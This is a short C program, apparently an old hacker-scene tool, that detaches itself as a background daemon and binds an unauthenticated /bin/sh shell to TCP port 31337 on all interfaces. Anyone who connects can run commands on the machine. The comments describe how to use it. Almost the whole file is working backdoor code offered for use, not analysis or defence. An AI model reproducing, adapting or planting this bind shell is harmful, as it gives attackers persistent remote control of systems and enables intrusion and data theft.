/* quick thingy... bind a shell to a socket... defaults to port 31337 */
/* code by pluvius@****** (address removed to protect the innocent :) */
/* don't forget.. when you connect to the port.. commands are like:   */
/* "ls -l;" or "exit;" (don't forget the ';')                         */

#define PORT 31337
#include <stdio.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int soc_des, soc_cli, soc_rc, soc_len, server_pid, cli_pid;
struct sockaddr_in serv_addr; 
struct sockaddr_in client_addr;

int main () 
{ 
    soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
    if (soc_des == -1) 
        exit(-1); 
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET; 
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(PORT);
    soc_rc = bind(soc_des, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
    if (soc_rc != 0) 
        exit(-1); 
    if (fork() != 0) 
        exit(0); 
    setpgrp();  
    signal(SIGHUP, SIG_IGN); 
    if (fork() != 0) 
        exit(0); 
    soc_rc = listen(soc_des, 5);
    if (soc_rc != 0) 
        exit(0); 
    while (1) { 
        soc_len = sizeof(client_addr);
        soc_cli = accept(soc_des, (struct sockaddr *) &client_addr, &soc_len);
        if (soc_cli < 0) 
            exit(0); 
        cli_pid = getpid(); 
        server_pid = fork(); 
        if (server_pid != 0) { 
            dup2(soc_cli,0); 
            dup2(soc_cli,1); 
            dup2(soc_cli,2);
            execl("/bin/sh","sh",(char *)0); 
            close(soc_cli); 
            exit(0); 
        } 
    close(soc_cli);
    }
}
